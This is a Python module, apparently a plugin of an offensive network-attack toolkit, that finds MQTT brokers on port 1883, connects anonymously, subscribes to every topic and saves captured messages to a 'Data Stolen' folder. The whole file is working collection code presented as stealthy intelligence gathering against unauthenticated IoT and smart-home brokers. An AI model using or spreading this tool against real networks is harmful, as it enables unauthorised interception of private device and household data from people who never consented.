"""
mqtt_scanner.py - MQTT broker discovery and passive message collection.

When port 1883 (MQTT) is found open, connects anonymously and subscribes to
all topics (#). Records messages for 30 seconds then saves topic list and
sample payloads to Data Stolen. Many IoT/smart-home MQTT brokers have no auth,
making this a zero-noise passive intelligence gather.
"""

import os
import json
import logging
import threading
import time
from datetime import datetime

try:
    import paho.mqtt.client as mqtt
    HAS_PAHO = True
except ImportError:
    HAS_PAHO = False

from shared import SharedData
from logger import Logger

logger = Logger(name="mqtt_scanner.py", level=logging.INFO)

b_class  = "MQTTScanner"
b_module = "mqtt_scanner"
b_status = "mqtt_scan"
b_port   = 1883
b_parent = None

COLLECT_SECONDS = 30   # How long to listen for messages
MAX_MESSAGES    = 200  # Cap to avoid huge files


class MQTTScanner:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        logger.info("MQTTScanner initialized")

    def execute(self, ip, port, row, status_key):
        if not getattr(self.shared_data, 'mqtt_scanner_enabled', True):
            return 'skipped'

        if not HAS_PAHO:
            logger.warning("paho-mqtt not installed — run: pip3 install paho-mqtt")
            return 'failed'

        mac = row.get("MAC", "unknown").replace(":", "").lower()
        out_dir = os.path.join(self.shared_data.datastolendir, "mqtt", f"{mac}_{ip}")
        info_file = os.path.join(out_dir, "mqtt_info.json")

        if os.path.exists(info_file):
            logger.info(f"MQTT already scanned {ip} — skipping")
            return 'success'

        self.shared_data.ragnarorch_status = b_status
        logger.info(f"📡 MQTTScanner: connecting to {ip}:{port}")

        messages = []
        connected = threading.Event()
        done = threading.Event()

        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                logger.info(f"  MQTT connected to {ip} (anonymous)")
                client.subscribe("#")
                connected.set()
            else:
                logger.info(f"  MQTT connection refused (rc={rc}) — broker requires auth")
                done.set()

        def on_message(client, userdata, msg):
            if len(messages) < MAX_MESSAGES:
                try:
                    payload = msg.payload.decode("utf-8", errors="replace")
                except Exception:
                    payload = repr(msg.payload)
                messages.append({
                    "topic": msg.topic,
                    "payload": payload,
                    "qos": msg.qos,
                    "retain": msg.retain,
                    "ts": datetime.now().isoformat(),
                })

        def on_disconnect(client, userdata, rc):
            done.set()

        client = mqtt.Client(client_id="", clean_session=True, protocol=mqtt.MQTTv311)
        client.on_connect    = on_connect
        client.on_message    = on_message
        client.on_disconnect = on_disconnect

        try:
            client.connect(ip, port, keepalive=60)
            client.loop_start()

            # Wait for connection or timeout
            if not connected.wait(timeout=8):
                logger.info(f"  MQTT: no connection to {ip} within 8s")
                client.loop_stop()
                return 'failed'

            # Collect messages for COLLECT_SECONDS
            logger.info(f"  MQTT: collecting messages for {COLLECT_SECONDS}s...")
            time.sleep(COLLECT_SECONDS)
            client.loop_stop()
            client.disconnect()

        except Exception as exc:
            logger.error(f"  MQTT error on {ip}: {exc}")
            try:
                client.loop_stop()
            except Exception:
                pass
            return 'failed'

        if not messages:
            logger.info(f"  MQTT: broker at {ip} is open but no messages received")
            # Still save metadata so we don't retry
            self._save(out_dir, info_file, ip, mac, messages)
            return 'success'

        logger.info(f"  ✅ MQTT: {len(messages)} messages collected from {ip}")
        self._save(out_dir, info_file, ip, mac, messages)
        return 'success'

    def _save(self, out_dir, info_file, ip, mac, messages):
        os.makedirs(out_dir, exist_ok=True)

        # Summarise unique topics
        topics = {}
        for m in messages:
            t = m["topic"]
            if t not in topics:
                topics[t] = {"count": 0, "last_payload": ""}
            topics[t]["count"] += 1
            topics[t]["last_payload"] = m["payload"]

        info = {
            "ip": ip,
            "mac": mac,
            "total_messages": len(messages),
            "unique_topics": len(topics),
            "topics": topics,
            "scanned_at": datetime.now().isoformat(),
        }
        with open(info_file, "w") as f:
            json.dump(info, f, indent=2)

        if messages:
            msgs_path = os.path.join(out_dir, "messages.json")
            with open(msgs_path, "w") as f:
                json.dump(messages, f, indent=2)
            logger.info(f"  Saved {len(messages)} messages → {msgs_path}")
